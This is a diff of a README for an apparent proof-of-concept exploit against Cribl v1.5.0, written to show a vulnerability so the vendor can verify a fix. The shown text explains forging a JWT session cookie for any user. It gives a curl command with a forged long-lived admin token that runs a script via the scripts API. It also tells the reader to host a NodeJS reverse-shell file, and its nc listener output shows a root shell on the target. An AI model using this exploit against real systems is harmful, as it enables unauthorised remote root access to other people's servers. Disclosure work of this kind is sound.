@@ -1,7 +1,7 @@
-#Disclaimer
+# Disclaimer  
 This is for informational/educational purposes only.  
 This was put together to demonstrate an insecurity in the tool, in order for a fix to be verified by the vendor.
-#Info
+# Info
 Tested on Cribl v1.5.0 - Previous versions not tested but likely vulnerable.  
 A valid JWT token can be transfered from and injected into the session of another Cribl instance, giving the user unauthorised access.  
 Furtermore, the encryption key used on to generate the JWT/Session can be used to create a valid session for any username, with an extended expiry.  
@@ -12,7 +12,7 @@ An example of such can be seen below, using the scripts  page and a long expiry 
 Tested using Docker (Alpine).
 
 
-#Running
+# Running
 First, modify (the remote host name) and upload your shell.js to your webserver. The file contains NodeJS code to create a reverse shell to your website.  
 The server must have outbound network access to your remote host/port.  
   
@@ -52,23 +52,24 @@ curl 'http://CRIBL_URL:9000/api/v1/system/scripts' \
 
 
 ```
-curl 'http://CRIBL_URL:9000/api/v1/system/scripts/reverseit2/run' \
+curl 'http://CRIBL_URL:9000/api/v1/system/scripts/reverseit/run' \
 -H 'Cookie: cribl_auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.lnXNKawtPIvfUR8D6RzrU5U1-_AHuPP1StShu4XiIFY' \
 --data-binary '{}' --compressed
 ```
 > {"pid":353,"stdout":"N/A","stderr":"N/A"}
 
-#Output
-nc -lvp 6669
-Listening on [0.0.0.0] (family 0, port 6669)
-Connection from [188.29.XXX.XXX] port 6669 [tcp/*] accepted (family 2, sport 13720)
-\> whoami  
-\< root  
+# Output
+```nc -lvp 6669  
+Listening on [0.0.0.0] (family 0, port 6669)  
+Connection from [188.29.XXX.XXX] port 6669 [tcp/*] accepted (family 2, sport 13720)  
+> whoami  
+< root  
   
-\> ls /  
-\< bin  
-\< dev  
-\< etc  
-\< home  
-\< lib  
+> ls /  
+< bin  
+< dev  
+< etc  
+< home  
+< lib  
 ...
+```
